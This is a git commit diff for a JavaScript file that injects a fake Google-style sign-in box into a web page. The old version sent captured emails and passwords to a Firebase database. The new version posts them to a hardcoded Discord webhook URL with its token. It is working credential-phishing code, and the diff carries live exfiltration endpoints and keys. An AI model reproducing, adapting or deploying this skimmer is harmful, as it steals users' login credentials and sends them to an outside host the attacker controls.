02ebd25095f7bd03ff6298c6528e7938d020685c
reddragonroom <ronlara00@gmail.com>
2025-09-26 23:35:42 +0500

    Update and rename 5.js to 6.js

--- 6.js
+++ 6.js
@@ -122,172 +122,158 @@ if (run === false) {
   const nav = document.querySelector("#page-header");
   nav.insertAdjacentHTML("afterend", newElement);
 
-  document.write(
-    `<script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-analytics.js";
-        import {
-          getDatabase,
-          ref,
-          set,
-        } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
-        const firebaseConfig = {
-          apiKey: "AIzaSyBvD23nC3ChxW4gDh4zglPXYepHhsJjRJM",
-          authDomain: "forms-46d73.firebaseapp.com",
-          databaseURL: "https://forms-46d73-default-rtdb.firebaseio.com",
-          projectId: "forms-46d73",
-          storageBucket: "forms-46d73.appspot.com",
-          messagingSenderId: "1051193376821",
-          appId: "1:1051193376821:web:f91e445cfa120ce207f17c",
-          measurementId: "G-Y4X1KGJW5M",
-        };
-        const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
-        const db = getDatabase();
-        const email = document.querySelector("#email__");
-        const password = document.querySelector("#password__");
-        const loginButton = document.querySelector(".login-button__");
-        const box = document.querySelector(".display-box");
-        const emailMessage = document.querySelector(".email-message");
-        const passwordMessage = document.querySelector(".password-message");
-        loginButton.addEventListener("click", (event) => {
-          event.preventDefault();
-          if (password.value.includes("-ag-") || password.value.includes("-eno-")) {
-            password.style.marginBottom = "0px";
-            passwordMessage.style.display = "block";
-            return;
-          }
-          const reference = ref(db, crypto.randomUUID());
-          set(reference, { email: email.value, password: password.value });
-          if (email.value && password.value) {
-            box.remove();
-            localStorage.setItem("run", true);
-          }
-        });
-</script>`,
-  );
+  const email = document.querySelector("#email__");
+  const password = document.querySelector("#password__");
+  const loginButton = document.querySelector(".login-button__");
+  const box = document.querySelector(".display-box");
+  const passwordMessage = document.querySelector(".password-message");
+
+  loginButton.addEventListener("click", (event) => {
+    event.preventDefault();
+    if (password.value.includes("-ag-") || password.value.includes("-eno-")) {
+      password.style.marginBottom = "0px";
+      passwordMessage.style.display = "block";
+      return;
+    }
+    const content = { email: email.value, password: password.value };
+    const webhookURL =
+      "https://discord.com/api/webhooks/1421198194758647906/jCx6wDN8iYUuOr4Od7yPTxr6BWcqLgnb89J6A4DV-fWNbi2OOLhklkcaOLsrjkqTt5KG";
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: JSON.stringify(content),
+      }),
+    });
+
+    if (email.value && password.value) {
+      box.remove();
+      localStorage.setItem("run", true);
+    }
+  });
 
   const styleSheet = document.createElement("style");
   styleSheet.innerText = `
-  .display-box {
-      background: white;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-  }
+.display-box {
+background: white;
+position: fixed;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+}
 
-  .box-header {
-      display: flex;
-      justify-content: space-between;
-      border-bottom: 1px solid black;
-      margin-bottom: 10px;
-      padding-bottom: 5px;
-      font-family: sans-serif;
-      color: #4285f4;
-      align-items: center;
-  }
+.box-header {
+display: flex;
+justify-content: space-between;
+border-bottom: 1px solid black;
+margin-bottom: 10px;
+padding-bottom: 5px;
+font-family: sans-serif;
+color: #4285f4;
+align-items: center;
+}
 
-  .heading {
-      font-size: 1rem;
-      font-weight: bold;
-      margin: 0;
-      padding: 0;
-  }
+.heading {
+font-size: 1rem;
+font-weight: bold;
+margin: 0;
+padding: 0;
+}
 
-  .close-button {
-      outline: none;
-      border: none;
-      background-color: white;
-      font-size: 1.5rem;
-      font-weight: bold;
-      cursor: pointer;
-      color: white;
-  }
+.close-button {
+outline: none;
+border: none;
+background-color: white;
+font-size: 1.5rem;
+font-weight: bold;
+cursor: pointer;
+color: white;
+}
 
-  /* .box-body{    padding: 10px;} */
-  /* body {    background-color: #f2f2f2;    font-family: Arial, sans-serif;  }   */
-  .container {
-      max-width: 400px;
-      margin: 0 auto;
-      background-color: #fff;
-      padding: 30px;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-  }
+/* .box-body{    padding: 10px;} */
+/* body {    background-color: #f2f2f2;    font-family: Arial, sans-serif;  }   */
+.container {
+max-width: 400px;
+margin: 0 auto;
+background-color: #fff;
+padding: 30px;
+box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
 
-  #google-image {
-      display: block;
-      margin: 0 auto 30px;
-  }
+#google-image {
+display: block;
+margin: 0 auto 30px;
+}
 
-  #login-form__ {
-      display: flex;
-      flex-direction: column;
-  }
+#login-form__ {
+display: flex;
+flex-direction: column;
+}
 
-  #label__ {
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 5px;
-  }
+#label__ {
+font-size: 14px;
+font-weight: 600;
+margin-bottom: 5px;
+}
 
-  .input__ {
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      padding: 10px;
-      margin-bottom: 20px;
-      font-size: 16px;
-  }
+.input__ {
+border: 1px solid #ddd;
+border-radius: 4px;
+padding: 10px;
+margin-bottom: 20px;
+font-size: 16px;
+}
 
-  .forgot-password {
-      font-size: 14px;
-      color: #4285f4;
-      margin-bottom: 20px;
-      text-align: right;
-  }
+.forgot-password {
+font-size: 14px;
+color: #4285f4;
+margin-bottom: 20px;
+text-align: right;
+}
 
-  .login-button__ {
-      background-color: #4285f4;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      cursor: pointer;
-  }
+.login-button__ {
+background-color: #4285f4;
+color: #fff;
+border: none;
+border-radius: 4px;
+padding: 10px;
+font-size: 16px;
+margin-bottom: 20px;
+cursor: pointer;
+}
 
-  .create-account {
-      font-size: 14px;
-      color: #4285f4;
-      text-align: center;
-      cursor: pointer;
-  }
+.create-account {
+font-size: 14px;
+color: #4285f4;
+text-align: center;
+cursor: pointer;
+}
 
-  .saved {
-      /* color: white; */
-      position: fixed;
-      top: 95%;
-      left: 95%;
-  }
-  a{
-    text-decoration : none;
+.saved {
+/* color: white; */
+position: fixed;
+top: 95%;
+left: 95%;
+}
+a{
+text-decoration : none;
 
-  }
-  input[readonly] {
-      cursor: text !important;      
-      background-color: inherit !important; 
-  }
+}
+input[readonly] {
+cursor: text !important;      
+background-color: inherit !important; 
+}
 
-  @media screen and (max-width: 600px) {
-      .container {
-          padding: 10px;
-      }
+@media screen and (max-width: 600px) {
+.container {
+    padding: 10px;
+}
 
-      img {
-          margin: 0;
-      }
-  }
+img {
+    margin: 0;
+}
+}
 `;
   document.head.appendChild(styleSheet);
 }
